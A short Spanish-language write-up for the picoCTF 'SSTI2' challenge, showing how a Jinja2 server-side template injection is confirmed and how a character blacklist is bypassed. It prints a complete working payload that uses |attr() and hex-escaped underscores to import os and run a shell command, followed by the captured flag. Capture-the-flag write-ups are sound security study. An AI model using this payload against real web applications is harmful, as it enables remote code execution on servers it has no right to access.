### SSTI2
### Descripcion
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:65360/)!
### Solucion
1. Identificamos el motor de plantillas enviando la operacion {{7*7}}. Al recibir 49, confirmamos que el sitio utiliza Jinja2 y que la inyeccion es posible.
2. Detectamos que el servidor bloquea caracteres especificos como puntos, guiones bajos y corchetes, lo que impide usar los comandos basicos de SSTI.
3. Evadimos estas restricciones utilizando el filtro |attr() de Jinja2 en lugar de puntos, y la representacion hexadecimal \x5f para reemplazar los guiones bajos.
4. Accedemos al objeto request para escalar a traves de la aplicacion hasta llegar a las funciones globales y los builtins de Python.
5. Importamos el modulo os para ejecutar el comando cat flag y leer el contenido del archivo directamente en la respuesta del servidor. Payload utilizado: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}
### Notas
### Referencias